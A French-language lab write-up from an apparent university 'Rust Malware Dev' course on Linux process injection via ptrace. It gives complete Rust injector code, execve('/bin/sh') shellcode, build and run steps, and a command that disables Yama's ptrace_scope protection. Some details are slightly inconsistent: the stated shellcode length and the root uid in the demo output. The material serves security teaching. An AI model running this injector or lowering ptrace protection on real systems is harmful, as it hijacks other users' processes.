# Write-up — Lab 15 : Rust Process Injection via ptrace

> **Embedded Security — Rust Malware Dev**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Rust](https://img.shields.io/badge/lang-Rust-orange.svg)]()
[![ptrace](https://img.shields.io/badge/technique-ptrace%20injection-red.svg)]()
[![Shellcode](https://img.shields.io/badge/shellcode-execve-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Injecter du shellcode dans un processus en cours d'exécution depuis Rust  
**Technique :** `ptrace::attach` → `PTRACE_GETREGS` → `PTRACE_POKETEXT` (shellcode à RIP) → `PTRACE_CONT`  
**Résultat :** Shell spawné dans le contexte du processus cible

---

## 2. Concept : ptrace process injection

```
Injector (Rust)                 Processus cible
     │                               │
     │  ptrace(ATTACH, pid)          │ ← stoppé par SIGSTOP
     │  waitpid()                    │
     │  PTRACE_GETREGS → RIP         │
     │  PTRACE_POKETEXT × N          │ ← shellcode écrit à RIP
     │  PTRACE_SETREGS               │
     │  PTRACE_CONT                  │ ← reprend → exécute shellcode
     │                               │ → execve("/bin/sh")
```

`PTRACE_POKETEXT` écrit 8 bytes à la fois dans la mémoire du processus cible — contourne les permissions NX car on écrit dans du code existant (déjà exécutable).

---

## 3. Shellcode — x64 execve, 26 bytes

```asm
xor rsi, rsi                      ; argv = NULL
xor rdx, rdx                      ; envp = NULL
movabs rbx, 0x0068732f6e69622f    ; "/bin/sh\0"
push rbx
mov rdi, rsp                      ; rdi = &"/bin/sh"
mov eax, 59                       ; SYS_execve
syscall
```

Null bytes tolérés — PTRACE_POKETEXT écrit en binaire (pas de strcpy).

---

## 4. Code — `injector/src/main.rs`

```rust
use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::Pid;

const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x53, 0x48, 0x89, 0xe7,
    0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05,
];

fn main() {
    let pid = Pid::from_raw(<PID>);
    ptrace::attach(pid).unwrap();
    waitpid(pid, None).unwrap();

    let mut regs = ptrace::getregs(pid).unwrap();
    let rip = regs.rip as usize;

    for (i, chunk) in SHELLCODE.chunks(8).enumerate() {
        let mut word = [0u8; 8];
        word[..chunk.len()].copy_from_slice(chunk);
        unsafe {
            ptrace::write(pid,
                (rip + i * 8) as *mut libc::c_void,
                i64::from_le_bytes(word) as *mut libc::c_void).unwrap();
        }
    }

    regs.rip = rip as u64;
    ptrace::setregs(pid, regs).unwrap();
    ptrace::cont(pid, None).unwrap();
}
```

---

## 5. Compilation et démonstration

```bash
# Compiler la cible C
gcc -o target target.c

# Compiler l'injecteur Rust
cd injector && cargo build --release && cd ..

# Terminal 1 — lancer le processus cible
./target
# [*] PID cible : 1234
# En vie...

# Terminal 2 — injecter (sudo requis pour ptrace cross-process)
sudo ./injector/target/release/injector 1234
# [*] Attaching PID 1234...
# [+] Attaché — processus stoppé
# [*] RIP = 0x7f...
# [*] Shellcode (26 bytes) écrit à 0x7f...
# [+] Exécution reprise → shell spawné
# $ id
# uid=0(root)...
```

---

## 6. Pourquoi ptrace nécessite sudo ?

Par défaut Linux bloque le ptrace cross-process via `/proc/sys/kernel/yama/ptrace_scope = 1`.  
Pour le lab :
```bash
# Temporairement (reset au reboot)
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
# OU lancer l'injecteur avec sudo
```

---

## 7. Progression Rust Red Team

| Lab | Technique | Concept clé |
| --- | --- | --- |
| Lab14 | Reverse shell | TcpStream + fd redirect |
| **Lab15** | **Process injection** | **ptrace POKETEXT + shellcode** |
| Lab16 | AMSI bypass | Hook ntdll (Windows) |
| Lab17 | Shellcode loader | mmap + exec |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Syscall ptrace | ATTACH → GETREGS → POKETEXT → SETREGS → CONT |
| Shellcode | 26 bytes — execve("/bin/sh") |
| Écriture mémoire | PTRACE_POKETEXT, 8 bytes/appel |
| Prérequis | sudo ou ptrace_scope = 0 |
| Avantage Rust | Sécurité mémoire au niveau de l'injecteur |

> Screenshot : [docs/lab15_rust_ptrace_injection.png](docs/lab15_rust_ptrace_injection.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
